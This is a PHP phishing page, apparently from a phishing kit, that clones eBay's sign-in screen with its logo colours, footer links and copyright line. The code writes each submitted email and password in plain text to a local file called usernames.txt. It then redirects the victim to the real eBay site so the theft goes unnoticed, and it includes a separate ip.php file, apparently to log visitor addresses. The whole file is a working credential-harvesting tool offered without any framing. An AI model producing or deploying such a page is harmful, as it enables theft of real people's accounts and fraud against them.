<?php
include 'ip.php';

if (isset($_POST['email']) && isset($_POST['password'])) {
    $email = $_POST['email'];
    $password = $_POST['password'];
    
    $file = fopen('usernames.txt', 'a');
    fwrite($file, "Email/Username: " . $email . " | Password: " . $password . "\n");
    fclose($file);
    
    header('Location: https://www.ebay.com');
    exit();
} else if (isset($_POST['email'])) {
    // First step - email only
    $email = $_POST['email'];
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Sign in to eBay</title>
        <link rel="icon" href="data:image/x-icon;base64,AAABAAEAEBAQAAEABAAoAQAAFgAAACgAAAAQAAAAIAAAAAEABAAAAAAAgAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAA">
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                font-family: 'Market Sans', Arial, sans-serif;
                background-color: #f7f7f7;
            }
            
            .header {
                background-color: #fff;
                border-bottom: 1px solid #e5e5e5;
                padding: 10px 0;
            }
            
            .header-content {
                max-width: 1200px;
                margin: 0 auto;
                padding: 0 20px;
                display: flex;
                align-items: center;
                justify-content: space-between;
            }
            
            .logo {
                font-size: 36px;
                font-weight: bold;
                color: #e53238;
                text-decoration: none;
                font-family: Arial, sans-serif;
            }
            
            .logo span:nth-child(1) { color: #e53238; }
            .logo span:nth-child(2) { color: #0064d2; }
            .logo span:nth-child(3) { color: #f5af02; }
            .logo span:nth-child(4) { color: #86b817; }
            
            .container {
                max-width: 450px;
                margin: 60px auto;
                background: #fff;
                padding: 40px;
                border-radius: 4px;
                box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            }
            
            h1 {
                font-size: 28px;
                color: #333;
                margin-bottom: 10px;
                font-weight: 400;
            }
            
            .email-display {
                color: #707070;
                margin-bottom: 30px;
                font-size: 14px;
            }
            
            .email-display strong {
                color: #333;
            }
            
            .input-group {
                margin-bottom: 20px;
            }
            
            label {
                display: block;
                margin-bottom: 8px;
                color: #707070;
                font-size: 14px;
            }
            
            input[type="password"] {
                width: 100%;
                padding: 12px;
                border: 1px solid #c7c7c7;
                border-radius: 4px;
                font-size: 15px;
                outline: none;
                transition: border-color 0.3s;
            }
            
            input[type="password"]:focus {
                border-color: #0064d2;
            }
            
            .btn-signin {
                width: 100%;
                padding: 14px;
                background-color: #3665f3;
                color: #fff;
                border: none;
                border-radius: 24px;
                font-size: 16px;
                font-weight: 500;
                cursor: pointer;
                transition: background-color 0.3s;
                margin-top: 10px;
            }
            
            .btn-signin:hover {
                background-color: #0053ba;
            }
            
            .forgot-password {
                text-align: center;
                margin-top: 15px;
            }
            
            .forgot-password a {
                color: #3665f3;
                text-decoration: none;
                font-size: 14px;
            }
            
            .forgot-password a:hover {
                text-decoration: underline;
            }
            
            .footer {
                max-width: 450px;
                margin: 20px auto;
                text-align: center;
                font-size: 12px;
                color: #707070;
            }
            
            .footer a {
                color: #3665f3;
                text-decoration: none;
                margin: 0 10px;
            }
            
            .footer a:hover {
                text-decoration: underline;
            }
        </style>
    </head>
    <body>
        <div class="header">
            <div class="header-content">
                <a href="#" class="logo">
                    <span>e</span><span>B</span><span>a</span><span>y</span>
                </a>
            </div>
        </div>
        
        <div class="container">
            <h1>Hello</h1>
            <div class="email-display">
                <strong><?php echo htmlspecialchars($email); ?></strong> | <a href="login.html" style="color: #3665f3; text-decoration: none;">Not you?</a>
            </div>
            
            <form action="login.php" method="POST">
                <input type="hidden" name="email" value="<?php echo htmlspecialchars($email); ?>">
                <div class="input-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" required>
                </div>
                
                <button type="submit" class="btn-signin">Sign in</button>
            </form>
            
            <div class="forgot-password">
                <a href="#">Forgot password?</a>
            </div>
        </div>
        
        <div class="footer">
            <p>
                <a href="#">About eBay</a>
                <a href="#">Announcements</a>
                <a href="#">Community</a>
                <a href="#">Security Center</a>
                <a href="#">Policies</a>
            </p>
            <p style="margin-top: 10px;">Copyright © 1995-2026 eBay Inc. All Rights Reserved.</p>
        </div>
    </body>
    </html>
    <?php
}
?>
